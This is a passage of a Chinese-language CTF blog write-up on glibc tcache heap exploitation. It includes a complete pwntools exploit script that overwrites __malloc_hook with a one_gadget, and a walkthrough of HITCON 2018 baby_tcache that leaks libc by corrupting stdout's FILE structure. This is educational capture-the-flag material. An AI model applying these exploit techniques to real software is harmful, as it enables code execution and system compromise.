+<h2 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./program&apos;)</span><br><span class="line">elf = ELF(&apos;program&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.27.so&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def create(size,content):</span><br><span class="line">    p.sendlineafter(&apos;Your choice: &apos;,&apos;1&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Size:&apos;,str(size))</span><br><span class="line">    p.sendafter(&apos;Data:&apos;,content)</span><br><span class="line"></span><br><span class="line">def show(index) :</span><br><span class="line">    p.sendlineafter(&apos;Your choice: &apos;,&apos;2&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def delete(index) :</span><br><span class="line">    p.sendlineafter(&apos;Your choice: &apos;,&apos;3&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">create(0x500, &apos;a&apos; * 0x4ff)</span><br><span class="line">create(0x68, &apos;b&apos; * 0x67)</span><br><span class="line">create(0x5f0, &apos;c&apos; * 0x5ef)</span><br><span class="line">create(0x20, &apos;d&apos; * 0x20)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">for i in range(9):</span><br><span class="line">    create(0x68 - i, &apos;b&apos; * (0x68 - i))</span><br><span class="line">    delete(0)</span><br><span class="line">create(0x68,&apos;b&apos;*0x60+p64(0x580))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">delete(2)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">create(0x508,&apos;a&apos;*0x507)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">show(0)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">data = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_base = data - 4111520</span><br><span class="line">print &apos;libc_base :&apos; + hex(libc_base)</span><br><span class="line"></span><br><span class="line">create(0x68,&apos;b&apos;*0x67)</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">one_addr = libc_base + 0x4f322</span><br><span class="line">create(0x68,p64(malloc_addr)+0x5f*&apos;a&apos;)</span><br><span class="line">create(0x68,&apos;a&apos;*0x67)</span><br><span class="line">create(0x68,p64(one_addr))</span><br><span class="line">print hex(malloc_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&apos;Your choice: &apos;,&apos;1&apos;)</span><br><span class="line">p.sendlineafter(&apos;Size:&apos;,&apos;10&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="2018-HITCON-baby-tcache："><a href="#2018-HITCON-baby-tcache：" class="headerlink" title="2018 HITCON baby_tcache："></a>2018 HITCON baby_tcache：</h3><p>比较标志性的一道<code>tcache</code>利用题，参杂了<code>IO_FILE</code>的利用。</p>
+<p>保护全开：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./baby_tcache</span><br><span class="line">[*] &apos;/home/v1nke/Desktop/tcache/HITCON baby_tcache/baby_tcache&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<p>整个程序只有<code>create</code>和<code>delete</code>，没有显示函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int create()</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v0; // rax</span><br><span class="line">  signed int i; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  _BYTE *v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 size; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt; 9 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = puts(&quot;:(&quot;);</span><br><span class="line">      return (signed int)v0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !qword_202060[i] )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Size:&quot;);</span><br><span class="line">  size = sub_B27();</span><br><span class="line">  if ( size &gt; 0x2000 )</span><br><span class="line">    exit(-2);</span><br><span class="line">  v3 = malloc(size);                            // size &lt; 0x2000</span><br><span class="line">  if ( !v3 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  printf(&quot;Data:&quot;);</span><br><span class="line">  sub_B88((__int64)v3, size);</span><br><span class="line">  v3[size] = 0;                                 // null-byte-one</span><br><span class="line">  qword_202060[i] = v3;</span><br><span class="line">  v0 = qword_2020C0;</span><br><span class="line">  qword_2020C0[i] = size;</span><br><span class="line">  return (signed int)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>create</code>函数中就存在一个<code>null-byte-one</code>漏洞，且<code>chunk size</code>可自行指定。<code>delete</code>中没有问题。</p>
+<p>没有显示函数的时候需要用到<code>IO_FILE</code>的一种方法去泄漏<code>libc</code>地址。就是修改stdout文件流中的<code>__IO_write_base</code>达到泄漏目的。具体看后面。</p>
+<p>既然有了<code>null-byte-one</code>漏洞，那么很容易想到用<code>Overlapping</code>。这里我也不多叙述了，具体的跟上面所提到的大同小异，也可以说是一样的，我着重介绍一下如何泄漏<code>libc</code>这一块。我们先利用前面的<code>tcache dup</code>在<code>_IO_2_1_stdout</code>上创建一个<code>chunk</code>，此时的<code>_IO_2_1_stdout</code>情况是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_IO_2_1_stdout_ </span><br><span class="line">$1 = (struct _IO_FILE_plus *) 0x7ff17c2fa760 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; x/20xg 0x7ff17c2fa760</span><br><span class="line">0x7ff17c2fa760 &lt;_IO_2_1_stdout_&gt;: 0x00000000fbad2887  0x00007ff17c2fa7e3</span><br><span class="line">0x7ff17c2fa770 &lt;_IO_2_1_stdout_+16&gt;:  0x00007ff17c2fa7e3  0x00007ff17c2fa7e3</span><br><span class="line">0x7ff17c2fa780 &lt;_IO_2_1_stdout_+32&gt;:  0x00007ff17c2fa7e3  0x00007ff17c2fa7e3</span><br><span class="line">0x7ff17c2fa790 &lt;_IO_2_1_stdout_+48&gt;:  0x00007ff17c2fa7e3  0x00007ff17c2fa7e3</span><br><span class="line">0x7ff17c2fa7a0 &lt;_IO_2_1_stdout_+64&gt;:  0x00007ff17c2fa7e4  0x0000000000000000</span><br><span class="line">0x7ff17c2fa7b0 &lt;_IO_2_1_stdout_+80&gt;:  0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>0x7ff17c2fa780处是<code>_IO_write_base</code>，也就是打印函数所打印的起始地址。我们将它改为我们所要构造的打印地址泄漏<code>libc</code>即可。我选择将它的最低位覆盖为<code>\x90</code>，这时候的情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x00007ff17c2fa790</span><br><span class="line">0x7ff17c2fa790 &lt;_IO_2_1_stdout_+48&gt;:  0x00007ff17c2fa7e3  0x00007ff17c2fa7e3</span><br><span class="line">0x7ff17c2fa7a0 &lt;_IO_2_1_stdout_+64&gt;:  0x00007ff17c2fa7e4  0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>所以可以泄漏出<code>libc</code>。但是这里还有一个重要的点就是需要更改0x7ff17c2fa760处的<code>_flag</code>的值。为什么呢？<code>puts</code>函数会调用<code>_IO_file_xsputn</code>函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_new_file_xsputn (FILE *f, const void *data, size_t n)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">if ((f-&amp;gt;_flags &amp;amp; _IO_LINE_BUF) &amp;amp;&amp;amp; (f-&amp;gt;_flags &amp;amp; _IO_CURRENTLY_PUTTING))　//flag bypass</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">if (to_do + must_flush &amp;gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">size_t block_size, do_write;</span><br><span class="line">if (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">return to_do == 0 ? EOF : n - to_do;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后会调用<code>_IO_new_file_overflow</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch)</span><br><span class="line">&#123;</span><br><span class="line">  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */      --&gt;  false</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  /* If currently reading or no buffer allocated. */</span><br><span class="line">  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      :</span><br><span class="line">      :</span><br><span class="line">    &#125;</span><br><span class="line">  if (ch == EOF)</span><br><span class="line">    return _IO_do_write (f, f-&gt;_IO_write_base, </span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>
+<p>然后调用<code>_IO_do_write</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">static</span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)              --&gt;  false</span><br><span class="line">    /* On a system without a proper O_APPEND implementation,</span><br><span class="line">       you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">       not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">       Instead, just indicate that offset (before and after) is</span><br><span class="line">       unpredictable. */</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">     ............</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);         --&gt; 我们所需要的目标</span><br></pre></td></tr></table></figure>
+<p>最后调用到<code>_IO_SYSWRITE</code>则是我们的最终目标，所以这中间我们需要过掉比较多的槛。</p>
+<p>默认的魔数是0xfbad0000。我们需要设置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.f-&gt;_flags &amp; _IO_NO_WRITES == 0</span><br><span class="line">2.f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</span><br><span class="line">3.fp-&gt;_flags &amp; _IO_IS_APPENDING == 0</span><br></pre></td></tr></table></figure>
+<p>所以这里我们设置flags为0xfbad1800。当我们成功修改的时候：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x7f007a2bb760</span><br><span class="line">0x7f007a2bb760 &lt;_IO_2_1_stdout_&gt;: 0x00000000fbad1800  0x00007f007a2bb7e3</span><br><span class="line">0x7f007a2bb770 &lt;_IO_2_1_stdout_+16&gt;:  0x00007f007a2bb7e3  0x00007f007a2bb7e3</span><br><span class="line">0x7f007a2bb780 &lt;_IO_2_1_stdout_+32&gt;:  0x00007f007a2bb7e3  0x00007f007a2bb7e3</span><br></pre></td></tr></table></figure>
+<p>可以看见修改了。接下来就可以愉快的泄漏<code>libc</code>了。后面就是常规的<code>tcache dup</code>修改<code>free_hook</code>操作了，自己可以尝试一下。</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>现在的<code>tcache</code>题目基本都给了<code>null-byte-one</code>的漏洞，一般都用<code>overlapping</code>来构造两个指针指向同一块来利用，有的会限制<code>chunk size</code>，那么就利用<code>unsortbin</code>来构造<code>overlapping</code>，有的限制了<code>show</code>函数功能，那么就利用<code>IO_FILE</code>修改<code>_IO_write_base</code>来泄漏，学会活灵活用。</p>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/11/13/CVE-2012-0158/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2019/02/25/记一次危险程序实战分析/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
